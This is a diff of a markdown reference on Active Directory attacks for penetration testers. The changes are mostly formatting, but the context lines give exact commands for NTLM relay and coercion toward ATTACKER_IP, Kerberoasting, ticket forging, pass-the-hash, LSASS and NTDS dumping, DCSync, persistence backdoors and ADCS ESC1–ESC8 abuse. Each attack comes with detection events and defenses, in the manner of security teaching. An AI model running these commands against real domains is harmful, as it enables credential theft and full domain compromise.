@@ -1,12 +1,12 @@
 # Active Directory Attacks
 
-> **Audience**: Penetration testers and red teamers. Every major AD attack with exact tool commands, ATT&CK mappings, detection event IDs, and defenses.
+> Audience: Penetration testers and red teamers. Every major AD attack with exact tool commands, ATT&CK mappings, detection event IDs, and defenses.
 
 | | |
 |---|---|
-| **Read this when** | Scoping an internal AD pentest or red team op, mapping a path to Domain Admins, or building detections and defenses for a specific AD attack |
-| **Start at** | [AD Fundamentals for Attackers](#_1-ad-fundamentals-for-attackers), [Enumeration & Reconnaissance](#_2-enumeration-amp-reconnaissance), [Tools Quick Reference](#_10-tools-quick-reference) |
-| **Pairs with** | [ACTIVE_DIRECTORY_ATTACK_REFERENCE.md](ACTIVE_DIRECTORY_ATTACK_REFERENCE.md), [ACTIVE_DIRECTORY_SECURITY_REFERENCE.md](ACTIVE_DIRECTORY_SECURITY_REFERENCE.md), [PENETRATION_TESTING_METHODOLOGY.md](PENETRATION_TESTING_METHODOLOGY.md), [WINDOWS_HARDENING_REFERENCE.md](WINDOWS_HARDENING_REFERENCE.md) |
+| Read this when | Scoping an internal AD pentest or red team op, mapping a path to Domain Admins, or building detections and defenses for a specific AD attack |
+| Start at | [AD Fundamentals for Attackers](#_1-ad-fundamentals-for-attackers), [Enumeration & Reconnaissance](#_2-enumeration-amp-reconnaissance), [Tools Quick Reference](#_10-tools-quick-reference) |
+| Pairs with | [ACTIVE_DIRECTORY_ATTACK_REFERENCE.md](ACTIVE_DIRECTORY_ATTACK_REFERENCE.md), [ACTIVE_DIRECTORY_SECURITY_REFERENCE.md](ACTIVE_DIRECTORY_SECURITY_REFERENCE.md), [PENETRATION_TESTING_METHODOLOGY.md](PENETRATION_TESTING_METHODOLOGY.md), [WINDOWS_HARDENING_REFERENCE.md](WINDOWS_HARDENING_REFERENCE.md) |
 
 ---
 
@@ -19,7 +19,7 @@
 - [5. Lateral Movement](#_5-lateral-movement)
 - [6. Credential Harvesting](#_6-credential-harvesting)
 - [7. Domain Persistence](#_7-domain-persistence)
-- [8. AD Certificate Services (ADCS) Attacks — ESC1–ESC8](#_8-ad-certificate-services-adcs-attacks-esc1esc8)
+- [8. AD Certificate Services (ADCS) Attacks — ESC1-ESC8](#_8-ad-certificate-services-adcs-attacks-esc1-esc8)
 - [9. Domain Trust Attacks](#_9-domain-trust-attacks)
 - [10. Tools Quick Reference](#_10-tools-quick-reference)
 - [11. Detection & Defense Summary](#_11-detection-amp-defense-summary)
@@ -32,38 +32,38 @@
 
 | Component | Description | Attacker Relevance |
 |-----------|-------------|-------------------|
-| **Domain** | Administrative boundary for users, computers, policies | Primary target scope |
-| **Forest** | Collection of domains sharing schema and global catalog | Cross-domain attack surface |
-| **Trust** | Authentication relationship between domains/forests | Lateral movement across domains |
-| **OU (Organizational Unit)** | Container for applying GPOs | GPO abuse, delegation misconfig |
-| **GPO (Group Policy Object)** | Policy applied to OUs/machines | Persistence, privilege escalation |
-| **Schema** | Defines AD object types and attributes | Schema Admin group = full control |
-| **LDAP** | Directory protocol for AD queries | Enumeration, AS-REP roasting |
-| **DNS** | Name resolution integrated with AD | DNS Admin abuse (DLL injection) |
-| **Kerberos** | Default authentication protocol | Kerberoasting, Golden/Silver tickets |
-| **SYSVOL** | Replicated share on all DCs | GPP password discovery |
+| Domain | Administrative boundary for users, computers, policies | Primary target scope |
+| Forest | Collection of domains sharing schema and global catalog | Cross-domain attack surface |
+| Trust | Authentication relationship between domains/forests | Lateral movement across domains |
+| OU (Organizational Unit) | Container for applying GPOs | GPO abuse, delegation misconfig |
+| GPO (Group Policy Object) | Policy applied to OUs/machines | Persistence, privilege escalation |
+| Schema | Defines AD object types and attributes | Schema Admin group = full control |
+| LDAP | Directory protocol for AD queries | Enumeration, AS-REP roasting |
+| DNS | Name resolution integrated with AD | DNS Admin abuse (DLL injection) |
+| Kerberos | Default authentication protocol | Kerberoasting, Golden/Silver tickets |
+| SYSVOL | Replicated share on all DCs | GPP password discovery |
 
 ### Key AD Object Types
 
-- **Users**: Standard and privileged accounts; service accounts with SPNs are Kerberoast targets
-- **Computers**: Domain-joined machines; machine accounts (COMPUTER$) can hold Kerberos tickets
-- **Groups**: Security vs. distribution; nested group membership is a common privilege escalation path
-- **Service Accounts**: Regular user accounts running services; often have weak passwords and broad permissions
-- **Group Managed Service Accounts (gMSA)**: Password auto-rotated by AD, no human-known password; read permission = compromise
+- Users: Standard and privileged accounts; service accounts with SPNs are Kerberoast targets
+- Computers: Domain-joined machines; machine accounts (COMPUTER$) can hold Kerberos tickets
+- Groups: Security vs. distribution; nested group membership is a common privilege escalation path
+- Service Accounts: Regular user accounts running services; often have weak passwords and broad permissions
+- Group Managed Service Accounts (gMSA): Password auto-rotated by AD, no human-known password; read permission = compromise
 
 ### Important AD Groups
 
 | Group | Default Privileges | Why Attackers Target It |
 |-------|-------------------|------------------------|
-| **Domain Admins** | Full control over domain | Ultimate goal for internal pentests |
-| **Enterprise Admins** | Full control over all domains in forest | Cross-forest/child-to-parent escalation |
-| **Schema Admins** | Modify AD schema | Persistent backdoors in schema |
-| **Administrators** | Local admin on all DCs | Can dump NTDS.dit |
-| **Account Operators** | Create/modify accounts (except privileged) | Create backdoor accounts |
-| **Server Operators** | Start/stop services on DCs | Service manipulation for SYSTEM |
-| **Backup Operators** | Backup any file (including NTDS.dit) | NTDS.dit extraction |
-| **Print Operators** | Load print drivers on DCs | Driver abuse for SYSTEM |
-| **DNSAdmins** | Manage DNS zones | DLL injection via DNS service restart |
+| Domain Admins | Full control over domain | Ultimate goal for internal pentests |
+| Enterprise Admins | Full control over all domains in forest | Cross-forest/child-to-parent escalation |
+| Schema Admins | Modify AD schema | Persistent backdoors in schema |
+| Administrators | Local admin on all DCs | Can dump NTDS.dit |
+| Account Operators | Create/modify accounts (except privileged) | Create backdoor accounts |
+| Server Operators | Start/stop services on DCs | Service manipulation for SYSTEM |
+| Backup Operators | Backup any file (including NTDS.dit) | NTDS.dit extraction |
+| Print Operators | Load print drivers on DCs | Driver abuse for SYSTEM |
+| DNSAdmins | Manage DNS zones | DLL injection via DNS service restart |
 
 ### Tiered Access Model (Tier 0/1/2)
 
@@ -73,27 +73,27 @@ Tier 1: Member servers, application servers
 Tier 2: User workstations, end-user devices
 ```
 
-**Why flattening creates attack paths**: When Tier 0 admins log into Tier 2 machines, their credentials cache on those machines. Any Tier 2 compromise (phishing, local exploit) yields DA credentials. BloodHound shortest paths exploit this directly.
+Why flattening creates attack paths: When Tier 0 admins log into Tier 2 machines, their credentials cache on those machines. Any Tier 2 compromise (phishing, local exploit) yields DA credentials. BloodHound shortest paths exploit this directly.
 
 ### AdminSDHolder
 
 AdminSDHolder is an AD object whose ACL is propagated to all privileged groups by the SDProp background process (runs every 60 minutes). If you modify the AdminSDHolder ACL to grant a backdoor account permissions, those permissions will be pushed to Domain Admins, Enterprise Admins, and other protected groups within 60 minutes — and will survive if manually removed from those groups.
 
-**Protected groups** (SDProp targets): Account Operators, Administrators, Backup Operators, Domain Admins, Domain Controllers, Enterprise Admins, Print Operators, Read-only Domain Controllers, Replicator, Schema Admins, Server Operators.
+Protected groups (SDProp targets): Account Operators, Administrators, Backup Operators, Domain Admins, Domain Controllers, Enterprise Admins, Print Operators, Read-only Domain Controllers, Replicator, Schema Admins, Server Operators.
 
 ### ACL / ACE Types Relevant to Attacks
 
 | Right | Description | Attack Path |
 |-------|-------------|------------|
-| **GenericAll** | Full control | Reset password, add to group, write any attribute |
-| **GenericWrite** | Write any property | Write SPN for Kerberoasting, write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD |
-| **WriteOwner** | Change object owner | Take ownership → grant GenericAll to self |
-| **WriteDACL** | Modify ACL | Grant self GenericAll → full compromise |
-| **ForceChangePassword** | Reset password without knowing current | Account takeover without detection |
-| **AllExtendedRights** | All extended rights including replication | DCSync capability |
-| **AddMember** | Add members to group | Add self to Domain Admins |
-| **Self** | Specific self-rights (e.g., self-membership) | Add self to group if Self-Membership extended right |
-| **Owns** | Object ownership | Take ownership → WriteDACL → GenericAll |
+| GenericAll | Full control | Reset password, add to group, write any attribute |
+| GenericWrite | Write any property | Write SPN for Kerberoasting, write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD |
+| WriteOwner | Change object owner | Take ownership -> grant GenericAll to self |
+| WriteDACL | Modify ACL | Grant self GenericAll -> full compromise |
+| ForceChangePassword | Reset password without knowing current | Account takeover without detection |
+| AllExtendedRights | All extended rights including replication | DCSync capability |
+| AddMember | Add members to group | Add self to Domain Admins |
+| Self | Specific self-rights (e.g., self-membership) | Add self to group if Self-Membership extended right |
+| Owns | Object ownership | Take ownership -> WriteDACL -> GenericAll |
 
 ---
 
@@ -121,7 +121,7 @@ bloodhound-python -u user -p password -d corp.local -ns 192.168.1.10 -c All --zi
 # bloodhound &
 ```
 
-**Key BloodHound built-in queries:**
+Key BloodHound built-in queries:
 - Shortest Path to Domain Admins
 - Find All Domain Admins
 - Find Principals with DCSync Rights
@@ -130,7 +130,7 @@ bloodhound-python -u user -p password -d corp.local -ns 192.168.1.10 -c All --zi
 - Find Kerberoastable Users (High Value)
 - Users with Most Privileges
 
-**Custom Cypher queries (Neo4j console):**
+Custom Cypher queries (Neo4j console):
 
 ```cypher
 -- Find all users with any path to DA within 5 hops
@@ -285,7 +285,7 @@ gppdecrypt.rb [cpassword_value]
 
 ### LLMNR / NBT-NS Poisoning (T1557.001)
 
-**Mechanism**: When a hostname lookup fails DNS, Windows falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS broadcasts. An attacker on the same network responds to these broadcasts, causing the victim to authenticate to the attacker's machine and sending an NTLMv2 hash.
+Mechanism: When a hostname lookup fails DNS, Windows falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS broadcasts. An attacker on the same network responds to these broadcasts, causing the victim to authenticate to the attacker's machine and sending an NTLMv2 hash.
 
 ```bash
 # Responder — listen, poison LLMNR/NBT-NS, and capture NTLMv2 hashes
@@ -305,13 +305,13 @@ mitm6 -d corp.local
 impacket-ntlmrelayx -6 -t ldaps://DC01.corp.local -wh attacker-wpad.corp.local --delegate-access
 ```
 
-- **Detection**: Event 4648 (explicit credential use), Zeek DNS/LLMNR logs, Responder-specific LLMNR response patterns, multicast DNS queries to non-standard respondents
-- **ATT&CK**: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)
-- **Defense**: Disable LLMNR via GPO (Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution = Enabled); disable NBT-NS in adapter settings or via DHCP option 001; deploy WPAD detection; enable SMB signing
+- Detection: Event 4648 (explicit credential use), Zeek DNS/LLMNR logs, Responder-specific LLMNR response patterns, multicast DNS queries to non-standard respondents
+- ATT&CK: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)
+- Defense: Disable LLMNR via GPO (Computer Configuration -> Administrative Templates -> Network -> DNS Client -> Turn Off Multicast Name Resolution = Enabled); disable NBT-NS in adapter settings or via DHCP option 001; deploy WPAD detection; enable SMB signing
 
 ### NTLM Relay Attack (T1557.001)
 
-**Mechanism**: Instead of cracking the captured NTLMv2 hash, relay the authentication attempt to another machine. If SMB signing is not required, the relay authenticates as the victim on the target.
+Mechanism: Instead of cracking the captured NTLMv2 hash, relay the authentication attempt to another machine. If SMB signing is not required, the relay authenticates as the victim on the target.
 
 ```bash
 # Step 1: Edit Responder config — disable SMB and HTTP servers
@@ -340,11 +340,11 @@ python3 printerbug.py corp.local/user:password@DC01.corp.local ATTACKER_IP
 python3 PetitPotam.py ATTACKER_IP DC01.corp.local
 ```
 
-- **Defense**: Enable SMB signing required (GPO: Microsoft Network Server: Digitally sign communications always = Enabled); LDAP signing + channel binding; EPA for HTTP; disable NTLM where possible; monitor relay tool signatures
+- Defense: Enable SMB signing required (GPO: Microsoft Network Server: Digitally sign communications always = Enabled); LDAP signing + channel binding; EPA for HTTP; disable NTLM where possible; monitor relay tool signatures
 
 ### Password Spraying (T1110.003)
 
-**Mechanism**: Try one or a few passwords against many accounts. Avoids lockout by staying under the bad password threshold.
+Mechanism: Try one or a few passwords against many accounts. Avoids lockout by staying under the bad password threshold.
 
 ```bash
 # Kerbrute (fast, uses Kerberos pre-auth — less noise than SMB)
@@ -369,8 +369,8 @@ nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on
 # Safe spray rate: 1 password attempt per user per 31 minutes
 ```
 
-- **Detection**: Event 4625 (failed logon) spikes from single source IP, Smart Lockout in Entra ID, UEBA baseline deviation
-- **Defense**: Smart lockout policy, Entra Password Protection (banned passwords list synced to on-prem), monitor 4625 bursts, Conditional Access with MFA
+- Detection: Event 4625 (failed logon) spikes from single source IP, Smart Lockout in Entra ID, UEBA baseline deviation
+- Defense: Smart lockout policy, Entra Password Protection (banned passwords list synced to on-prem), monitor 4625 bursts, Conditional Access with MFA
 
 ---
 
@@ -378,7 +378,7 @@ nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on
 
 ### Kerberoasting (T1558.003)
 
-**Mechanism**: Any domain user can request a TGS for any service account with an SPN. The TGS is encrypted with the service account's NTLM hash. Extract and crack offline.
+Mechanism: Any domain user can request a TGS for any service account with an SPN. The TGS is encrypted with the service account's NTLM hash. Extract and crack offline.
 
 ```bash
 # ── Linux (Impacket) ─────────────────────────────────────────────────────────
@@ -401,13 +401,13 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file ru
 hashcat -m 19700 kerberoast_aes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-- **Detection**: Event 4769 (Kerberos Service Ticket Operations) with Ticket Encryption Type 0x17 (RC4-HMAC) from non-DC source, unusually high volume of 4769 events from single workstation
-- **ATT&CK**: T1558.003
-- **Defense**: Use strong random passwords (25+ chars) for all service accounts; configure AES-only Kerberos encryption (set `msDS-SupportedEncryptionTypes = 24` — AES128+AES256 only); migrate service accounts to gMSA (passwords 240-char, auto-rotated)
+- Detection: Event 4769 (Kerberos Service Ticket Operations) with Ticket Encryption Type 0x17 (RC4-HMAC) from non-DC source, unusually high volume of 4769 events from single workstation
+- ATT&CK: T1558.003
+- Defense: Use strong random passwords (25+ chars) for all service accounts; configure AES-only Kerberos encryption (set `msDS-SupportedEncryptionTypes = 24` — AES128+AES256 only); migrate service accounts to gMSA (passwords 240-char, auto-rotated)
 
 ### AS-REP Roasting (T1558.004)
 
-**Mechanism**: Accounts with "Do not require Kerberos preauthentication" enabled send an AS-REP that is partially encrypted with the user's NTLM hash — extractable without authenticating first.
+Mechanism: Accounts with "Do not require Kerberos preauthentication" enabled send an AS-REP that is partially encrypted with the user's NTLM hash — extractable without authenticating first.
 
 ```bash
 # ── No creds required (if you have a user list) ─────────────────────────────
@@ -429,15 +429,15 @@ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
 ```
 
-- **Detection**: Event 4768 (Kerberos Authentication Service) with Pre-Authentication Type = 0 (no preauth), especially from unusual sources
-- **ATT&CK**: T1558.004
-- **Defense**: Never disable Kerberos pre-authentication (it is enabled by default; audit accounts where it's disabled); monitor for 4768 with PreAuth type 0
+- Detection: Event 4768 (Kerberos Authentication Service) with Pre-Authentication Type = 0 (no preauth), especially from unusual sources
+- ATT&CK: T1558.004
+- Defense: Never disable Kerberos pre-authentication (it is enabled by default; audit accounts where it's disabled); monitor for 4768 with PreAuth type 0
 
 ### Golden Ticket (T1558.001)
 
-**Mechanism**: With the krbtgt NTLM hash, forge a Ticket-Granting Ticket (TGT) for any user with any group membership. Does not require communication with the DC to generate.
+Mechanism: With the krbtgt NTLM hash, forge a Ticket-Granting Ticket (TGT) for any user with any group membership. Does not require communication with the DC to generate.
 
-**Requirements**: krbtgt NTLM hash, Domain SID, domain name. Any username (can be non-existent).
+Requirements: krbtgt NTLM hash, Domain SID, domain name. Any username (can be non-existent).
 
 ```bash
 # ── Get krbtgt hash ──────────────────────────────────────────────────────────
@@ -472,15 +472,15 @@ Rubeus.exe ptt /ticket:golden.kirbi
 dir \\DC01\C$
 ```
 
-- **Detection**: Event 4769 with anomalous ticket parameters (lifetime > 10h, KVNO mismatch), Event 4672 (special privilege logon) with unusual SIDs in token, PAC validation failures — but Golden Tickets bypass most standard detection when using valid domain parameters
-- **ATT&CK**: T1558.001
-- **Defense**: Rotate krbtgt password TWICE with 10+ hour gap between rotations (to invalidate all existing TGTs); enable Credential Guard; add DAs to Protected Users group; monitor 4769 anomalies
+- Detection: Event 4769 with anomalous ticket parameters (lifetime > 10h, KVNO mismatch), Event 4672 (special privilege logon) with unusual SIDs in token, PAC validation failures — but Golden Tickets bypass most standard detection when using valid domain parameters
+- ATT&CK: T1558.001
+- Defense: Rotate krbtgt password TWICE with 10+ hour gap between rotations (to invalidate all existing TGTs); enable Credential Guard; add DAs to Protected Users group; monitor 4769 anomalies
 
 ### Silver Ticket (T1558.002)
 
-**Mechanism**: Forge a service ticket (TGS) for a specific service using that service account's NTLM hash. Does not require krbtgt hash, but access is limited to that one service.
+Mechanism: Forge a service ticket (TGS) for a specific service using that service account's NTLM hash. Does not require krbtgt hash, but access is limited to that one service.
 
-**Requirements**: Service account NTLM hash, Domain SID, target SPN.
+Requirements: Service account NTLM hash, Domain SID, target SPN.
 
 ```bash
 # Get service account hash (multiple methods: Kerberoast, PtH, secretsdump)
@@ -506,13 +506,13 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass corp.local/Administrator@SERVER01.corp.local
 ```
 
-- **Detection**: Harder to detect than Golden Ticket because no DC communication needed; look for tickets with no corresponding AS-REQ (4768) or TGS-REQ (4769) for the issuing DC
-- **ATT&CK**: T1558.002
-- **Defense**: Rotate service account passwords regularly; use gMSA; enable PAC validation (validate PAC on every service request)
+- Detection: Harder to detect than Golden Ticket because no DC communication needed; look for tickets with no corresponding AS-REQ (4768) or TGS-REQ (4769) for the issuing DC
+- ATT&CK: T1558.002
+- Defense: Rotate service account passwords regularly; use gMSA; enable PAC validation (validate PAC on every service request)
 
 ### Diamond Ticket
 
-**Mechanism**: Similar to Golden Ticket but requests a legitimate TGT from the DC first, then decrypts and modifies the PAC (using krbtgt key) to add privileged group memberships. Bypasses PAC validation anomaly detection.
+Mechanism: Similar to Golden Ticket but requests a legitimate TGT from the DC first, then decrypts and modifies the PAC (using krbtgt key) to add privileged group memberships. Bypasses PAC validation anomaly detection.
 
 ```bash
 # Rubeus Diamond Ticket
@@ -546,7 +546,7 @@ impacket-psexec -k -no-pass corp.local/administrator@TARGET.corp.local
 
 ### Unconstrained Delegation Abuse (T1558)
 
-**Mechanism**: Computers/accounts with unconstrained delegation store TGTs of any user that authenticates to them. Compromise such a host → collect TGTs → reuse them (including DC machine account TGT for DCSync).
+Mechanism: Computers/accounts with unconstrained delegation store TGTs of any user that authenticates to them. Compromise such a host -> collect TGTs -> reuse them (including DC machine account TGT for DCSync).
 
 ```bash
 # ── Find unconstrained delegation machines ───────────────────────────────────
@@ -574,7 +574,7 @@ impacket-secretsdump -k -no-pass corp.local/DC01\$@DC01.corp.local
 
 ### Constrained Delegation Abuse (S4U2Proxy)
 
-**Mechanism**: Accounts configured for constrained delegation can impersonate any user to a specific set of services via the S4U2Self + S4U2Proxy extension. If "Protocol Transition" is allowed (TRUSTED_TO_AUTH_FOR_DELEGATION flag), no prior Kerberos auth from the impersonated user is required.
+Mechanism: Accounts configured for constrained delegation can impersonate any user to a specific set of services via the S4U2Self + S4U2Proxy extension. If "Protocol Transition" is allowed (TRUSTED_TO_AUTH_FOR_DELEGATION flag), no prior Kerberos auth from the impersonated user is required.
 
 ```bash
 # ── Find constrained delegation accounts ────────────────────────────────────
@@ -596,7 +596,7 @@ impacket-smbclient -k -no-pass fileserver.corp.local
 
 ### Resource-Based Constrained Delegation (RBCD) (T1558)
 
-**Mechanism**: If you have GenericWrite/GenericAll over a computer object, you can configure it to accept delegated authentication from a computer account you control. Then use S4U to impersonate any user (including Domain Admin) on that target.
+Mechanism: If you have GenericWrite/GenericAll over a computer object, you can configure it to accept delegated authentication from a computer account you control. Then use S4U to impersonate any user (including Domain Admin) on that target.
 
 ```powershell
 # ── Requirements ─────────────────────────────────────────────────────────────
@@ -637,7 +637,7 @@ Set-DomainObject TARGET01 -Clear 'msds-allowedtoactonbehalfofotheridentity'
 
 ### Pass-the-Hash (T1550.002)
 
-**Mechanism**: Use NTLM hash directly for authentication — no plaintext password needed. NTLM authentication accepts the hash as the credential.
+Mechanism: Use NTLM hash directly for authentication — no plaintext password needed. NTLM authentication accepts the hash as the credential.
 
 ```bash
 # ── Impacket suite ───────────────────────────────────────────────────────────
@@ -662,9 +662,9 @@ mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:
 evil-winrm -i TARGET01 -u administrator -H NTLM_HASH
 ```
 
-- **Detection**: Event 4624 (Type 3 logon, NTLM provider) from unexpected source; NtLmSsp provider in audit logs; no corresponding 4768/4769 (no Kerberos)
-- **ATT&CK**: T1550.002
-- **Defense**: Protected Users group (blocks NTLM caching and NTLM auth for members); Windows Defender Credential Guard (isolates LSASS); restrict NTLM (Network security: Restrict NTLM); LAPS for local accounts
+- Detection: Event 4624 (Type 3 logon, NTLM provider) from unexpected source; NtLmSsp provider in audit logs; no corresponding 4768/4769 (no Kerberos)
+- ATT&CK: T1550.002
+- Defense: Protected Users group (blocks NTLM caching and NTLM auth for members); Windows Defender Credential Guard (isolates LSASS); restrict NTLM (Network security: Restrict NTLM); LAPS for local accounts
 
 ### Over-Pass-the-Hash (T1550.003)
 
@@ -799,9 +799,9 @@ pypykatz lsa minidump lsass.dmp -o lsass_creds.json
 python3 rekall/rekal.py --format lime -f memory.lime mimikatz
 ```
 
-- **Detection**: Sysmon Event ID 10 (ProcessAccess) with TargetImage containing "lsass.exe" and GrantedAccess 0x1010 or 0x1038; EDR LSASS protection alerts; Windows Defender Credential Guard events
-- **ATT&CK**: T1003.001
-- **Defense**: Enable Credential Guard (virtualizes LSASS — extracts only blank values); Enable PPL (Protected Process Light) for LSASS (RunAsPPL=1 in registry); ASR rule "Block credential stealing from Windows local security authority subsystem" (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0); Disable WDigest caching
+- Detection: Sysmon Event ID 10 (ProcessAccess) with TargetImage containing "lsass.exe" and GrantedAccess 0x1010 or 0x1038; EDR LSASS protection alerts; Windows Defender Credential Guard events
+- ATT&CK: T1003.001
+- Defense: Enable Credential Guard (virtualizes LSASS: extracts only blank values); Enable PPL (Protected Process Light) for LSASS (RunAsPPL=1 in registry); ASR rule "Block credential stealing from Windows local security authority subsystem" (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0); Disable WDigest caching
 
 ### SAM Database Extraction (T1003.002)
 
@@ -850,9 +850,9 @@ nxc smb DC01 -u administrator -p password --ntds drsuapi  # DCSync method
 
 ### DCSync (T1003.006)
 
-**Mechanism**: Replication protocol abuse. With DS-Replication permissions, request replication of a specific account from a DC. Mimics legitimate DC-to-DC replication. Does NOT require code execution on DC.
+Mechanism: Replication protocol abuse. With DS-Replication permissions, request replication of a specific account from a DC. Mimics legitimate DC-to-DC replication. Does NOT require code execution on DC.
 
-**Required rights**: GetChanges + GetChangesAll (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). Default holders: Domain Admins, Enterprise Admins, Domain Controllers, SYSTEM on DC. Also: Azure AD Connect account in hybrid environments.
+Required rights: GetChanges + GetChangesAll (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). Default holders: Domain Admins, Enterprise Admins, Domain Controllers, SYSTEM on DC. Also: Azure AD Connect account in hybrid environments.
 
 ```bash
 # ── Mimikatz DCSync ──────────────────────────────────────────────────────────
@@ -872,9 +872,9 @@ impacket-secretsdump -just-dc -hashes :NTLM_HASH corp.local/administrator@DC01.c
 Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity backdoor_user -Rights DCSync -Verbose
 ```
 
-- **Detection**: Event 4662 on the DC with ObjectType GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (GetChangesAll) or `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (GetChanges), where the caller IP is NOT another DC
-- **ATT&CK**: T1003.006
-- **Defense**: Strict Tier 0 access control; monitor 4662 for non-DC sources; isolate Azure AD Connect server; regularly audit who has DS-Replication rights
+- Detection: Event 4662 on the DC with ObjectType GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (GetChangesAll) or `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (GetChanges), where the caller IP is NOT another DC
+- ATT&CK: T1003.006
+- Defense: Strict Tier 0 access control; monitor 4662 for non-DC sources; isolate Azure AD Connect server; regularly audit who has DS-Replication rights
 
 ---
 
@@ -971,7 +971,7 @@ Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
 Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemBootFilter'" | Remove-WmiObject
 ```
 
-- **Detection**: Sysmon Event 19 (WmiEventFilter activity), Event 20 (WmiEventConsumer), Event 21 (WmiEventConsumerToFilter binding)
+- Detection: Sysmon Event 19 (WmiEventFilter activity), Event 20 (WmiEventConsumer), Event 21 (WmiEventConsumerToFilter binding)
 
 ### Golden Certificate (T1553 / CA Backdoor)
 
@@ -1009,7 +1009,7 @@ impacket-psexec -hashes :DSRM_NTLM_HASH DC01\administrator@DC01
 
 ---
 
-## 8. AD Certificate Services (ADCS) Attacks — ESC1–ESC8
+## 8. AD Certificate Services (ADCS) Attacks: ESC1-ESC8
 
 Reference: "Certified Pre-Owned" (SpecterOps, Will Schroeder & Lee Christensen, 2021)
 
@@ -1020,9 +1020,9 @@ certipy find -u user@corp.local -p password -dc-ip 192.168.1.10 -vulnerable -std
 # Or BloodHound with ADCS data: bloodhound-python with --collect all-with-certificates
 ```
 
-### ESC1 — Enrollee Supplies Subject (SAN)
+### ESC1: Enrollee Supplies Subject (SAN)
 
-**Condition**: Certificate template allows requester to specify Subject Alternative Name; enrollee supplies subject = True; low-privilege enrollment rights.
+Condition: Certificate template allows requester to specify Subject Alternative Name; enrollee supplies subject = True; low-privilege enrollment rights.
 
 ```bash
 certipy find -u user@corp.local -p password -dc-ip 192.168.1.10
@@ -1036,9 +1036,9 @@ certipy req -ca 'corp-CA' -template VulnerableTemplate -upn administrator@corp.l
 certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
 ```
 
-### ESC2 — Any Purpose EKU
+### ESC2: Any Purpose EKU
 
-**Condition**: Template has "Any Purpose" or no EKU restriction — can be used for any purpose including client authentication.
+Condition: Template has "Any Purpose" or no EKU restriction — can be used for any purpose including client authentication.
 
 ```bash
 # Certificate can be used for smartcard auth
@@ -1046,9 +1046,9 @@ certipy req -ca 'corp-CA' -template ESC2Template -u user@corp.local -p password
 certipy auth -pfx user.pfx
 ```
 
-### ESC3 — Enrollment Agent Template Abuse
+### ESC3: Enrollment Agent Template Abuse
 
-**Condition**: Template allows enrollment agent + another template allows enrollment agent to enroll on behalf of others.
+Condition: Template allows enrollment agent + another template allows enrollment agent to enroll on behalf of others.
 
 ```bash
 # Step 1: Get enrollment agent certificate
@@ -1060,9 +1060,9 @@ certipy req -ca 'corp-CA' -template User -on-behalf-of corp\\administrator -pfx 
 certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
 ```
 
-### ESC4 — Vulnerable Certificate Template ACL
+### ESC4: Vulnerable Certificate Template ACL
 
-**Condition**: Attacker has write access to a certificate template object (e.g., GenericAll, GenericWrite, WriteProperty).
+Condition: Attacker has write access to a certificate template object (e.g., GenericAll, GenericWrite, WriteProperty).
 
 ```bash
 # Modify template to add enrollee-supplied subject (ESC1-style)
@@ -1073,9 +1073,9 @@ certipy req -ca 'corp-CA' -template VulnTemplate -upn administrator@corp.local -
 certipy auth -pfx administrator.pfx
 ```
 
-### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA
+### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA
 
-**Condition**: CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows any template's requests to include SAN even if template doesn't require it.
+Condition: CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows any template's requests to include SAN even if template doesn't require it.
 
 ```bash
 # Check CA configuration
@@ -1087,9 +1087,9 @@ certipy req -ca 'corp-CA' -template User -upn administrator@corp.local -u user@c
 certipy auth -pfx administrator.pfx
 ```
 
-### ESC7 — Vulnerable CA ACL
+### ESC7: Vulnerable CA ACL
 
-**Condition**: Attacker has ManageCA or ManageCertificates rights on the CA object.
+Condition: Attacker has ManageCA or ManageCertificates rights on the CA object.
 
 ```bash
 # Add yourself as CA officer to enable ManageCertificates
@@ -1102,9 +1102,9 @@ certipy ca -ca 'corp-CA' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 -u user@cor
 certipy ca -ca 'corp-CA' -issue-request 12 -u user@corp.local -p password
 ```
 
-### ESC8 — NTLM Relay to AD CS HTTP Enrollment
+### ESC8: NTLM Relay to AD CS HTTP Enrollment
 
-**Condition**: CA has Web Enrollment (certsrv) enabled without EPA; HTTPS not enforced or NTLM relay is possible.
+Condition: CA has Web Enrollment (certsrv) enabled without EPA; HTTPS not enforced or NTLM relay is possible.
 
 ```bash
 # Step 1: Start relay targeting ADCS web enrollment
@@ -1122,8 +1122,8 @@ certipy auth -pfx DC01.pfx -dc-ip 192.168.1.10  # Authenticate as DC01$
 impacket-secretsdump -k -no-pass corp.local/DC01\$@DC01.corp.local
 ```
 
